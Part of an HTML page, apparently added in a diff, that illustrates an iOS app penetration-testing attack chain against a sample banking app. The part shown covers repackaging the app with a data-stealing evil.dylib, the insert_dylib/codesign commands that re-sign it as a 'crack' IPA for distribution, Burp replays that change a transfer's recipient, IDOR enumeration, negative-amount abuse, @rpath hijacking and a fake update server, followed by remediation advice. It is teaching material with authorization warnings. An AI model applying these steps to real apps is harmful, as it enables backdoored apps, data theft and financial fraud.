+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">TROJAN</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/>
+        <line x1="30" y1="62" x2="16" y2="58" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <circle cx="8" cy="64" r="9" fill="#ff6b6b" opacity=".9"/>
+        <path d="M14 56 q6 -8 12 -6" fill="none" stroke="#ffd93d" stroke-width="2.5"/>
+        <circle cx="27" cy="49" r="2.5" fill="#ffd93d"/>
+      </svg>
+      <div class="char-label">投毒者</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff6b6b">5a</div>
+      <div class="step-name">二次打包</div>
+    </div>
+    <div class="card" style="border-color:#ff6b6b; --acc:#ff6b6b">
+      <h2>☠️ 二次打包投毒分发 <span class="en">Repackage &amp; Repack</span> <span class="parent-tag" style="background:#ff6b6b">⑤ 攻击落地</span></h2>
+      <div class="desc">
+        在正常 App 里植入后门，重签名后投放到第三方市场 / 企业分发渠道。
+        用户拿到的是<strong>「能正常用」的 App</strong>，但后台已在窃取数据 —— 这是最危险的破坏形态。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>正常 App + evil.dylib + 企业签名证书</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>用户无感知的投毒 IPA</div>
+      </div>
+      <div class="code"><span class="lbl">evil.dylib</span><span class="c">// 注入后 App 启动瞬间执行，用户完全无感知</span>
+__attribute__((<span class="f">constructor</span>)) <span class="k">static void</span> <span class="f">init</span>() {
+  <span class="c">// 1. 上报设备指纹 + 已安装 App 列表</span>
+  [<span class="t">EvilC2</span> <span class="f">reportDevice</span>];
+
+  <span class="c">// 2. Hook 登录方法，回传明文账号密码</span>
+  [<span class="t">EvilC2</span> <span class="f">hookLogin</span>];          <span class="c">// ← 见 4b 的同一套手法</span>
+
+  <span class="c">// 3. 后台静默外传通讯录 / 相册 / 定位 / 剪贴板</span>
+  [<span class="t">EvilC2</span> <span class="f">exfiltrate</span>:@{
+    <span class="s">@"contacts"</span>: [<span class="t">CNContactStore</span> <span class="f">allContacts</span>],
+    <span class="s">@"photos"</span>:   [<span class="t">PHAsset</span> <span class="f">recentItems</span>],
+    <span class="s">@"location"</span>: [<span class="t">CLLocationManager</span> <span class="f">lastKnown</span>]
+  }];
+
+  <span class="c">// 4. 保持原 App 功能完全正常，避免用户察觉</span>
+}</div>
+      <div class="transform-arrow">⬇️ <span class="label">重签名后投放到分发渠道</span> ⬇️</div>
+      <div class="code"><span class="lbl">分发链</span>$ insert_dylib @executable_path/evil.dylib TargetApp --inplace
+$ codesign -f -s <span class="s">"iPhone Distribution: EvilCorp"</span> --deep Payload/TargetApp.app
+$ zip -qr TargetApp-v3.2.1-crack.ipa Payload/
+
+<span class="c"># 投放到：第三方应用市场 / 企业内部分发页 / 越狱源 / 钓鱼下载站</span>
+<span class="c"># 用户看到的是「原版 App + 破解/去广告」的诱饵</span></div>
+      <div class="tips">
+        <span class="tip info">破坏力评级：<strong>严重</strong> —— 影响所有下载者，且用户无法察觉</span>
+        <span class="tip warn">属于真实攻击手法，仅在授权评估中演示 PoC，禁止实际分发</span>
+        <span class="tip cmd">zip -qr TargetApp-v3.2.1-crack.ipa Payload/</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5b -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff6b6b">改个数～</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff6b6b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff6b6b"/><circle cx="59" cy="31" r="4.5" fill="#ff6b6b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff6b6b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff6b6b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">TAMPER</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/>
+        <line x1="30" y1="64" x2="16" y2="60" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <path d="M2 46 q14 8 0 16 q14 8 0 16" fill="none" stroke="#ff6b6b" stroke-width="2.5"/>
+      </svg>
+      <div class="char-label">篡改者</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff6b6b">5b</div>
+      <div class="step-name">中间人篡改</div>
+    </div>
+    <div class="card" style="border-color:#ff6b6b; --acc:#ff6b6b">
+      <h2>🎭 中间人窃取与业务篡改 <span class="en">MITM &amp; Tampering</span> <span class="parent-tag" style="background:#ff6b6b">⑤ 攻击落地</span></h2>
+      <div class="desc">
+        利用 4c 打通的通道，读取明文流量中的账号、余额、订单，
+        并<strong>篡改金额、收款方、优惠券等业务参数后重放</strong>。若服务端无二次校验，直接造成资损。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>明文 API + 有效 Token（来自 4c / 4d）</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>被篡改的业务请求 + 实际资损结果</div>
+      </div>
+      <div class="code"><span class="lbl">Burp Repeater</span><span class="c"># 原始请求（4c 抓到的明文）</span>
+<span class="p">POST</span> /v1/transfer <span class="p">HTTP/1.1</span>
+<span class="at">Authorization: Bearer</span> eyJhbGciOiJIUzI1NiIs...
+{<span class="s">"from"</span>:<span class="s">"6222****1234"</span>, <span class="s">"to"</span>:<span class="e">"6222****9999"</span>,
+ <span class="s">"amount"</span>:<span class="n">10000</span>, <span class="s">"memo"</span>:<span class="s">"转账"</span>}</div>
+      <div class="transform-arrow">⬇️ <span class="label">只改 to 字段，原样重放</span> ⬇️</div>
+      <div class="code"><span class="lbl">篡改后重放</span><span class="c"># 篡改后重放</span>
+{<span class="s">"from"</span>:<span class="s">"6222****1234"</span>, <span class="s">"to"</span>:<span class="e">"6222****6666"</span>,   <span class="e">← 改成攻击者账户</span>
+ <span class="s">"amount"</span>:<span class="n">10000</span>, <span class="s">"memo"</span>:<span class="s">"转账"</span>}
+
+<span class="p">HTTP/1.1</span> <span class="r">200 OK</span>
+{<span class="s">"code"</span>:<span class="n">0</span>, <span class="s">"msg"</span>:<span class="s">"success"</span>}     <span class="e">← 服务端无二次校验，转账成功</span></div>
+      <div class="tips">
+        <span class="tip info">客户端加密 ≠ 安全 —— 密钥就在包里（见 2e），加密只是把明文换成可解密的密文</span>
+        <span class="tip warn">涉及资金的操作必须在授权范围内、用测试账户、<strong>绝不真实执行</strong></span>
+        <span class="tip cmd">Burp Repeater 改包重放</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5c -->
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff6b6b">挨个试～</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff6b6b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff6b6b"/><circle cx="59" cy="31" r="4.5" fill="#ff6b6b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff6b6b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff6b6b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">IDOR</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/>
+        <line x1="30" y1="64" x2="16" y2="56" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <line x1="2" y1="62" x2="20" y2="46" stroke="#ff6b6b" stroke-width="3.5" stroke-linecap="round"/>
+        <path d="M2 62 q-4 -6 2 -10" fill="none" stroke="#ff6b6b" stroke-width="3"/>
+      </svg>
+      <div class="char-label">越权者</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff6b6b">5c</div>
+      <div class="step-name">越权遍历</div>
+    </div>
+    <div class="card" style="border-color:#ff6b6b; --acc:#ff6b6b">
+      <h2>👑 越权与业务逻辑漏洞利用 <span class="en">IDOR &amp; Logic Flaws</span> <span class="parent-tag" style="background:#ff6b6b">⑤ 攻击落地</span></h2>
+      <div class="desc">
+        用 4d 拿到的 Token 遍历用户 ID、订单 ID，测试<strong>水平/垂直越权、IDOR、批量刷券、负数金额</strong>等逻辑漏洞。
+        移动端 API 往往比 Web 端鉴权更松。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>有效 Token + 接口清单（来自 2e 的 H5 bundle）</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>他人隐私数据 / 无限领券 / 反向充值</div>
+      </div>
+      <div class="code"><span class="lbl">水平越权 IDOR</span><span class="c"># 用 A 用户的 Token 遍历 B/C/D 用户</span>
+<span class="p">GET</span> /v1/user/<span class="n">10001</span>/profile  → <span class="r">200</span>  <span class="c">自己</span>
+<span class="p">GET</span> /v1/user/<span class="n">10002</span>/profile  → <span class="r">200</span>  <span class="e">← 他人资料，越权成功</span>
+<span class="p">GET</span> /v1/user/<span class="n">10003</span>/profile  → <span class="r">200</span>  <span class="e">← 可批量遍历全量用户</span>
+
+<span class="c"># Burp Intruder 跑 10001-99999 → 3.2 万条身份证/手机号</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">换一类漏洞继续试</span> ⬇️</div>
+      <div class="code"><span class="lbl">业务逻辑</span><span class="c"># ① 负数领取 = 无限券</span>
+<span class="p">POST</span> /v1/coupon/redeem  {<span class="s">"code"</span>:<span class="s">"NEW2026"</span>, <span class="s">"times"</span>:<span class="e">-1</span>}
+  → <span class="r">200</span>  <span class="e">券数量变成 +1，可无限循环</span>
+
+<span class="c"># ② 负数金额 = 反向充值</span>
+<span class="p">POST</span> /v1/order/create  {<span class="s">"amount"</span>:<span class="e">-100</span>, <span class="s">"sku"</span>:<span class="s">"VIP_YEAR"</span>}
+  → <span class="r">200</span>  <span class="e">账户余额 +100，会员到期时间 +1 年</span>
+
+<span class="c"># ③ 垂直越权：普通用户调用管理接口</span>
+<span class="p">GET</span> /v1/admin/user/list  → <span class="r">200</span>  <span class="e">← 仅靠前端隐藏入口，服务端未鉴权</span></div>
+      <div class="tips">
+        <span class="tip info">拿到 Token 之后，<strong>服务端鉴权是唯一防线</strong>；前端隐藏 ≠ 无接口</span>
+        <span class="tip warn">批量遍历属于高风险操作，必须严格限定 ID 范围并事先获得书面授权</span>
+        <span class="tip cmd">Burp Intruder / Autorize 插件</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- 5d -->
+  <div class="stage right">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ff6b6b">一锅端！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ff6b6b" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ff6b6b"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ff6b6b" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ff6b6b"/><circle cx="59" cy="31" r="4.5" fill="#ff6b6b"/>
+        <rect x="43" y="41" width="14" height="3" rx="1.5" fill="#ff6b6b" opacity=".55"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ff6b6b" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">SUPPLY</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ff6b6b" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ff6b6b"/>
+        <line x1="30" y1="62" x2="16" y2="58" stroke="#ff6b6b" stroke-width="4" stroke-linecap="round"/>
+        <rect x="4" y="46" width="16" height="24" rx="3" fill="none" stroke="#ff6b6b" stroke-width="2.5"/>
+        <rect x="8" y="41" width="8" height="6" rx="2" fill="#ff6b6b"/>
+        <circle cx="12" cy="58" r="3.5" fill="#ffd93d"/>
+      </svg>
+      <div class="char-label">投毒师</div>
+    </div>
+    <div class="connector">
+      <div class="dot small" style="background:#ff6b6b">5d</div>
+      <div class="step-name">供应链劫持</div>
+    </div>
+    <div class="card" style="border-color:#ff6b6b; --acc:#ff6b6b">
+      <h2>🏭 供应链与 SDK 后门 <span class="en">Supply Chain</span> <span class="parent-tag" style="background:#ff6b6b">⑤ 攻击落地</span></h2>
+      <div class="desc">
+        攻击面不止 App 本身。<strong>第三方 SDK、H5 资源包、热更新通道、<code>@rpath</code> 加载路径</strong>，
+        任一环节被控即可影响<strong>全部用户</strong>，且开发者自己毫无察觉。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>SDK 依赖 / 热更新通道 / 动态库加载路径</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>供应链级后门，影响全量用户</div>
+      </div>
+      <div class="code"><span class="lbl">① @rpath 劫持</span><span class="c"># 2d 发现 @rpath 是相对路径 → 同目录同名 dylib 优先加载</span>
+Payload/TargetApp.app/Frameworks/AFNetworking.framework/
+  └── AFNetworking      <span class="e">← 替换为恶意版本，App 正常启动但流量全被劫持</span>
+
+<span class="c"># 也可直接往 Frameworks/ 塞一个同名 dylib</span>
+$ cp evil.dylib Payload/TargetApp.app/Frameworks/</div>
+      <div class="transform-arrow">⬇️ <span class="label">换一条更宽的攻击面</span> ⬇️</div>
+      <div class="code"><span class="lbl">② H5 热更新劫持</span><span class="c"># 1a 发现 ATS 全局关闭 + H5 走明文 HTTP</span>
+<span class="p">GET</span> <span class="e">http://</span>cdn.example.com/h5/bundle.js   <span class="e">← 明文，可中间人替换</span>
+  → 注入 JS：窃取 WebView 内登录态 / 调用 JSBridge 原生能力
+
+<span class="c"># 一旦被劫持，无需发版即可影响所有已安装的 App</span></div>
+      <div class="transform-arrow">⬇️ <span class="label">最后一步：自己当更新源</span> ⬇️</div>
+      <div class="code"><span class="lbl">③ 伪造更新源</span>$ python3 -m http.server <span class="n">80</span> --directory ./fake-update/
+<span class="c"># 配合 DNS 劫持 / 内网 ARP，把官方更新域名指向本地</span>
+<span class="c"># 下发「新版本」= 完整后门，用户主动安装</span></div>
+      <div class="tips">
+        <span class="tip info">一次投毒 → 全量用户受影响，是<strong>破坏等级最高</strong>的攻击形态</span>
+        <span class="tip warn">此类测试需要最高级别授权；SDK 攻击还需与 SDK 厂商协调</span>
+        <span class="tip cmd">python3 -m http.server 80 --directory ./fake-update/</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============ 终点 ============ -->
+  <div class="phase-divider left">
+    <div class="phase-banner p-done">
+      <div class="phase-title">🎉 终点：攻击链闭环 · Chain Closed</div>
+      <div class="cmd">$ 完整攻击链复现 + 影响评估 + 修复建议</div>
+    </div>
+  </div>
+
+  <div class="stage left">
+    <div class="character">
+      <div class="bubble" style="border-left-color:#ffd93d">收工！</div>
+      <svg viewBox="0 0 100 130" xmlns="http://www.w3.org/2000/svg">
+        <line x1="50" y1="16" x2="50" y2="6" stroke="#ffd93d" stroke-width="3" stroke-linecap="round"/>
+        <circle cx="50" cy="5" r="4" fill="#ffd93d"/>
+        <rect x="28" y="16" width="44" height="32" rx="11" fill="#252545" stroke="#ffd93d" stroke-width="3"/>
+        <circle cx="41" cy="31" r="4.5" fill="#ffd93d"/><circle cx="59" cy="31" r="4.5" fill="#ffd93d"/>
+        <path d="M40 40 q10 7 20 0" fill="none" stroke="#ffd93d" stroke-width="2.5" stroke-linecap="round"/>
+        <rect x="30" y="53" width="40" height="34" rx="9" fill="#ffd93d" opacity=".92"/>
+        <text x="50" y="74" font-size="10" font-weight="900" text-anchor="middle" fill="#0f0f23" font-family="Fira Code,monospace">REPORT</text>
+        <rect x="37" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ffd93d" stroke-width="2"/>
+        <rect x="55" y="90" width="8" height="16" rx="4" fill="#252545" stroke="#ffd93d" stroke-width="2"/>
+        <rect x="33" y="105" width="16" height="6" rx="3" fill="#ffd93d"/><rect x="51" y="105" width="16" height="6" rx="3" fill="#ffd93d"/>
+        <line x1="30" y1="62" x2="16" y2="52" stroke="#ffd93d" stroke-width="4" stroke-linecap="round"/>
+        <rect x="2" y="40" width="18" height="24" rx="3" fill="none" stroke="#ffd93d" stroke-width="2.5"/>
+        <line x1="6" y1="47" x2="16" y2="47" stroke="#ffd93d" stroke-width="2"/>
+        <line x1="6" y1="53" x2="16" y2="53" stroke="#ffd93d" stroke-width="2"/>
+        <line x1="6" y1="59" x2="12" y2="59" stroke="#ffd93d" stroke-width="2"/>
+      </svg>
+      <div class="char-label">出报告</div>
+    </div>
+    <div class="connector">
+      <div class="dot" style="background:linear-gradient(135deg,#ffd93d,#e8a300)">★</div>
+      <div class="step-name">闭环</div>
+    </div>
+    <div class="card" style="border-color:#ffd93d; --acc:#ffd93d">
+      <h2>🏁 完整攻击链闭环 <span class="en">Full Chain Closed</span> <span class="parent-tag" style="background:#ffd93d; color:#1a1a2e">★ 终点</span></h2>
+      <div class="desc">
+        从「一个 IPA 文件」到「可控、可篡改、可分发的完整攻击链」。
+        最终产出不只是一堆漏洞，而是一条<strong>能端到端复现的攻击路径</strong>和可落地的修复方案。
+      </div>
+      <div class="io">
+        <div class="io-box in"><span class="tag">📥 输入</span>全流程证据链 + PoC 脚本 + 验证结果</div>
+        <div class="io-box out"><span class="tag">📤 输出</span>攻击链报告 + 影响评估 + 修复建议</div>
+      </div>
+      <div class="code"><span class="lbl">攻击链总览</span><span class="c"># 全程追踪同一个目标：TargetApp.ipa (com.example.bankwallet v3.2.1)</span>
+<span class="n">①</span> 情报侦察 → Bundle ID / API 域名 / <span class="e">内网 IP</span> / <span class="e">UAT 环境</span> / 7 个 URL Scheme
+<span class="n">②</span> 静态分析 → 脱壳 + <span class="n">1204</span> 个头文件 + 伪代码
+             挖出 <span class="e">Stripe sk_live 密钥</span> / <span class="e">AWS AK</span> / <span class="e">内置 RSA 私钥</span>
+<span class="n">③</span> 重打包  → 注入 dylib + 重签名 → 可观测可篡改的运行环境
+<span class="n">④</span> 动态分析 → Hook + 抓包 + Keychain
+             拿到 <span class="e">明文密码 P@ssw0rd2024!</span> / <span class="e">Bearer Token</span> / <span class="e">明文 PIN 1234</span>
+<span class="n">⑤</span> 攻击落地 → 投毒分发 / MITM 改收款账户 / IDOR 遍历 3.2 万用户 / 供应链劫持
+──────────────────────────────────────────────────────</div>
+      <div class="transform-arrow">⬇️ <span class="label">汇总为可交付的攻击链报告</span> ⬇️</div>
+      <div class="code"><span class="lbl">交付物</span><span class="r">最终产出：</span>
+  ✓ 完整攻击链复现步骤（含 Frida PoC 脚本、Burp 请求包）
+  ✓ 泄露凭证与密钥清单（<span class="e">已逐一验证有效性</span>）
+  ✓ 业务影响评估（资损金额 / 数据量级 / 声誉风险）
+  ✓ 修复建议：
+      · 服务端二次校验（金额、收款方、业务参数）
+      · 密钥迁移到服务端 / KMS，客户端只持短期票据
+      · 全站 HTTPS + 证书绑定（含 BoringSSL 层）
+      · Keychain 使用 <span class="i">kSecAttrAccessibleWhenUnlockedThisDeviceOnly</span>
+      · dylib 完整性校验 + <span class="i">__RESTRICT</span> 段 + 反调试加固
+      · SDK 依赖锁定版本 + H5 资源走 HTTPS + 子资源完整性校验</div>
+      <div class="tips">
+        <span class="tip info">攻击链的价值在于<strong>串联</strong> —— 单个中危漏洞串起来可能是严重级</span>
+        <span class="tip warn">报告需明确区分「客户端可绕过」与「服务端真实缺陷」，后者才是修复重点</span>
+        <span class="tip cmd">最终交付：攻击链报告 + PoC + 修复建议</span>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /factory -->
+
+<!-- ===== SUMMARY ===== -->
+<div class="summary">
+  <h2>📋 全流程总览</h2>
+  <table>
+    <thead>
+      <tr>
+        <th style="width:70px">步骤</th>
+        <th style="width:110px">阶段</th>
+        <th>输入</th>
+        <th>输出</th>
+        <th>核心工作</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><span class="dot" style="background:#8890b0"></span><strong>S</strong></td>
+        <td>起点</td>
+        <td>TargetApp.ipa（12 MB）</td>
+        <td>待分析包 + 攻击面假设</td>
+        <td>确认分发渠道、判断是否加密</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#4d96ff"></span><strong>1a</strong></td>
+        <td>情报侦察</td>
+        <td>TargetApp.ipa</td>
+        <td>目录树 + Info.plist</td>
+        <td>解包、读 Bundle ID / ATS / URL Scheme</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#4d96ff"></span><strong>1b</strong></td>
+        <td>情报侦察</td>
+        <td>Mach-O 主程序</td>
+        <td>架构 / cryptid / 依赖库</td>
+        <td>file + otool 二进制侦察</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#4d96ff"></span><strong>1c</strong></td>
+        <td>情报侦察</td>
+        <td>加密 Mach-O</td>
+        <td>域名 / 内网 IP / 密钥候选</td>
+        <td>strings 字符串速扫</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#4d96ff"></span><strong>1d</strong></td>
+        <td>情报侦察</td>
+        <td>.app 完整目录</td>
+        <td>攻击面地图</td>
+        <td>entitlements / Scheme / SDK 测绘</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#cc5de8"></span><strong>2a</strong></td>
+        <td>静态分析</td>
+        <td>加密 Mach-O（cryptid=1）</td>
+        <td>TargetApp.decrypted（cryptid=0）</td>
+        <td><strong>脱壳解密</strong>（静态分析前置条件）</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#cc5de8"></span><strong>2b</strong></td>
+        <td>静态分析</td>
+        <td>TargetApp.decrypted</td>
+        <td>1204 个 .h 头文件</td>
+        <td>class-dump 还原类与方法</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#cc5de8"></span><strong>2c</strong></td>
+        <td>静态分析</td>
+        <td>TargetApp.decrypted + headers</td>
+        <td>伪代码 + 绕过点清单</td>
+        <td>IDA / Hopper 反汇编</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#cc5de8"></span><strong>2d</strong></td>
+        <td>静态分析</td>
+        <td>TargetApp.decrypted</td>
+        <td>依赖库清单 + CVE + 符号泄露</td>
+        <td>otool -L / dwarfdump 依赖审计</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#cc5de8"></span><strong>2e</strong></td>
+        <td>静态分析</td>
+        <td>全量资源 + 脱壳二进制</td>
+        <td>密钥 / 证书 / 账号清单</td>
+        <td><strong>硬编码密钥挖掘 + 有效性验证</strong></td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff922b"></span><strong>3a</strong></td>
+        <td>重打包</td>
+        <td>.app + FridaGadget.dylib</td>
+        <td>已注入的 Mach-O</td>
+        <td>insert_dylib / optool 注入</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff922b"></span><strong>3b</strong></td>
+        <td>重打包</td>
+        <td>已注入 .app + 证书</td>
+        <td>已签名 App</td>
+        <td>codesign 重签 + entitlements 伪造</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff922b"></span><strong>3c</strong></td>
+        <td>重打包</td>
+        <td>TargetApp-patched.ipa</td>
+        <td>运行中的进程（可附加）</td>
+        <td>ideviceinstaller 安装并验证</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#20c997"></span><strong>4a</strong></td>
+        <td>动态分析</td>
+        <td>运行中的 TargetApp 进程</td>
+        <td>类 / 方法 / 模块清单</td>
+        <td>objection 运行时枚举（含 Swift）</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#20c997"></span><strong>4b</strong></td>
+        <td>动态分析</td>
+        <td>方法签名清单</td>
+        <td>明文密码 + 被篡改的返回值</td>
+        <td>Frida Hook 登录 / 风控 / 支付</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#20c997"></span><strong>4c</strong></td>
+        <td>动态分析</td>
+        <td>设备流量 + Burp 代理</td>
+        <td>明文 API + Bearer Token</td>
+        <td>SSL Pinning 绕过 + 抓包</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#20c997"></span><strong>4d</strong></td>
+        <td>动态分析</td>
+        <td>App 沙盒 + Keychain</td>
+        <td>Token / PIN / 手机号 / 卡缓存</td>
+        <td>keychain dump / nsuserdefaults / sqlite</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#20c997"></span><strong>4e</strong></td>
+        <td>动态分析</td>
+        <td>检测函数清单</td>
+        <td>无检测的干净环境</td>
+        <td>越狱 / 反调试 / 完整性校验绕过</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff6b6b"></span><strong>5a</strong></td>
+        <td>攻击落地</td>
+        <td>正常 App + evil.dylib</td>
+        <td>投毒 IPA（用户无感知）</td>
+        <td>二次打包 + 企业证书分发</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff6b6b"></span><strong>5b</strong></td>
+        <td>攻击落地</td>
+        <td>明文 API + 有效 Token</td>
+        <td>被篡改的业务请求</td>
+        <td>MITM 改收款账户 / 改金额 / 重放</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff6b6b"></span><strong>5c</strong></td>
+        <td>攻击落地</td>
+        <td>Token + 接口清单</td>
+        <td>他人隐私数据 / 无限领券</td>
+        <td>IDOR 遍历 + 业务逻辑漏洞</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ff6b6b"></span><strong>5d</strong></td>
+        <td>攻击落地</td>
+        <td>SDK / 热更新通道 / @rpath</td>
+        <td>供应链级后门</td>
+        <td>dylib 劫持 / H5 投毒 / 伪造更新源</td>
+      </tr>
+      <tr>
+        <td><span class="dot" style="background:#ffd93d"></span><strong>★</strong></td>
+        <td>闭环</td>
+        <td>全流程证据链 + PoC</td>
+        <td>攻击链报告 + 修复建议</td>
+        <td>串联漏洞、评估影响、输出方案</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>💥 破坏能力矩阵 —— 每一步能做到什么</h3>
+  <table>
+    <thead>
+      <tr>
+        <th style="width:200px">攻击手段</th>
+        <th>可直接造成的破坏</th>
+        <th style="width:150px">影响范围</th>
+        <th style="width:110px">破坏等级</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>硬编码密钥泄露 <span style="color:#cc5de8">(2e)</span></td>
+        <td>伪造服务端身份、直接调用付费 API、读取生产交易数据</td>
+        <td>全量用户数据</td>
+        <td class="sev" style="color:#ff4444">🔴 严重</td>
+      </tr>
+      <tr>
+        <td>二次打包投毒 <span style="color:#ff6b6b">(5a)</span></td>
+        <td>植入后门，静默窃取通讯录 / 相册 / 定位 / 账号密码</td>
+        <td>所有下载者</td>
+        <td class="sev" style="color:#ff4444">🔴 严重</td>
+      </tr>
+      <tr>
+        <td>MITM 篡改 <span style="color:#ff6b6b">(5b)</span></td>
+        <td>篡改收款账户、转账金额、订单内容，直接造成资金损失</td>
+        <td>单个 / 批量用户</td>
+        <td class="sev" style="color:#ff4444">🔴 严重</td>
+      </tr>
+      <tr>
+        <td>供应链 / SDK 后门 <span style="color:#ff6b6b">(5d)</span></td>
+        <td>一次投毒影响全部用户，开发者无感知，无需发版即可生效</td>
+        <td>全量用户</td>
+        <td class="sev" style="color:#ff4444">🔴 严重</td>
+      </tr>
+      <tr>
+        <td>Keychain / 本地存储 <span style="color:#20c997">(4d)</span></td>
+        <td>拿到明文 Token 与支付 PIN，设备丢失即账户失守</td>
+        <td>单设备 → 可扩散</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>IDOR / 越权遍历 <span style="color:#ff6b6b">(5c)</span></td>
+        <td>批量拉取他人身份证、手机号、订单、余额</td>
+        <td>全量用户</td>
+        <td class="sev" style="color:#ff922b">🟠 高</td>
+      </tr>
+      <tr>
+        <td>SSL Pinning 缺失 <span style="color:#20c997">(4c)</span></td>
+        <td>全量 API 暴露，可任意改包、重放、模糊测试</td>
+        <td>全量用户</td>
